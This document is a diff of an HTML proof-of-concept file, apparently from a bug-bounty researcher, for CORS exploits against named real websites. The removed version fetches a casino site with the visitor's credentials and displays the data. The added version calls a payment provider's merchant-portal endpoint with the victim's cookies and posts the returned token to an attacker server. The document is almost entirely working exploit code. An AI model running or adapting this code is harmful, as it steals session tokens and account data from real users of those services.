@@ -1,68 +1,21 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Exploit by cyb3r_c0re17</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            text-align: center;
-            padding-top: 50px;
-        }
-        h1 {
-            color: #333;
-        }
-        button {
-            padding: 15px 30px;
-            font-size: 16px;
-            color: #fff;
-            background-color: #007BFF;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-    </style>
-</head>
-<body>
-
-    <h1>CORS Exploit by cyb3r_c0re17</h1>
-    <p>Click the button below to exploit CORS vulnerability.</p>
-
-    <!-- Exploit Button -->
-    <button onclick="exploitCORS()">Exploit</button>
-
-    <script>
-        // Function to trigger CORS exploit
-        function exploitCORS() {
-            // Vulnerable endpoint (replace this with the actual endpoint if necessary)
-            const url = 'https://www.galacasino.com/';
-
-            // Perform the CORS request
-            fetch(url, {
-                method: 'GET',
-                credentials: 'include' // Include credentials (cookies, tokens)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json(); // Parse JSON response
-            })
-            .then(data => {
-                // Display the CORS data in a popup
-                alert('CORS Data: ' + JSON.stringify(data, null, 2));
-            })
-            .catch(error => {
-                alert('CORS Exploit Failed: ' + error.message);
-            });
-        }
-    </script>
-
-</body>
-</html>
+<script>
+  fetch('https://dashboard.rapyd.net/v1/merchants-portal/users/is-email-verified', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({ "email": "Cyb3r_C0re17@wearehackerone.com" })
+  })
+  .then(response => response.json())
+  .then(data => {
+    // Send the token to the attacker's server
+    fetch('https://attacker-server.com/steal-token', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ stolenToken: data.data.token })
+    });
+  });
+</script>
